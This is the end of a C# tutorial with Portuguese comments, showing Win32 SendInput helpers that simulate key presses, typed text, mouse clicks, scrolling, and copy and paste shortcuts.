    private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    private const uint MOUSEEVENTF_LEFTUP = 0x0004;
    private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
    private const uint MOUSEEVENTF_WHEEL = 0x0800;

    // Simular tecla
    public static void SimulateKey(Keys key, bool keyUp = false)
    {
        INPUT[] inputs = new INPUT[1];
        inputs[0].type = INPUT_KEYBOARD;
        inputs[0].U.ki.wVk = (ushort)key;
        inputs[0].U.ki.dwFlags = keyUp ? KEYEVENTF_KEYUP : KEYEVENTF_KEYDOWN;

        SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    // Simular texto
    public static void SimulateText(string text)
    {
        foreach (char c in text)
        {
            INPUT[] inputs = new INPUT[2];

            // Key down
            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].U.ki.wVk = 0;
            inputs[0].U.ki.wScan = c;
            inputs[0].U.ki.dwFlags = KEYEVENTF_UNICODE;

            // Key up
            inputs[1].type = INPUT_KEYBOARD;
            inputs[1].U.ki.wVk = 0;
            inputs[1].U.ki.wScan = c;
            inputs[1].U.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;

            SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
        }
    }

    // Simular clique do mouse
    public static void SimulateClick(int x, int y, bool rightClick = false)
    {
        // Normalizar coordenadas para absolute
        int screenWidth = GetSystemMetrics(0);
        int screenHeight = GetSystemMetrics(1);

        int absoluteX = (x * 65535) / screenWidth;
        int absoluteY = (y * 65535) / screenHeight;

        INPUT[] inputs = new INPUT[3];

        // Move
        inputs[0].type = INPUT_MOUSE;
        inputs[0].U.mi.dx = absoluteX;
        inputs[0].U.mi.dy = absoluteY;
        inputs[0].U.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;

        // Down
        inputs[1].type = INPUT_MOUSE;
        inputs[1].U.mi.dwFlags = rightClick ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;

        // Up
        inputs[2].type = INPUT_MOUSE;
        inputs[2].U.mi.dwFlags = rightClick ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;

        SendInput(3, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    // Simular scroll
    public static void SimulateScroll(int delta)
    {
        INPUT[] inputs = new INPUT[1];
        inputs[0].type = INPUT_MOUSE;
        inputs[0].U.mi.mouseData = (uint)delta;
        inputs[0].U.mi.dwFlags = MOUSEEVENTF_WHEEL;

        SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);

    // Simular combinação de teclas
    public static void SimulateKeyCombination(params Keys[] keys)
    {
        // Press all
        foreach (var key in keys)
            SimulateKey(key, false);

        Thread.Sleep(50);

        // Release all (reverse order)
        for (int i = keys.Length - 1; i >= 0; i--)
            SimulateKey(keys[i], true);
    }

    // Ctrl+C
    public static void SimulateCopy()
    {
        SimulateKeyCombination(Keys.ControlKey, Keys.C);
    }

    // Ctrl+V
    public static void SimulatePaste()
    {
        SimulateKeyCombination(Keys.ControlKey, Keys.V);
    }
}
```

Este guia cobre hooks de teclado, mouse, janelas e clipboard em C#!
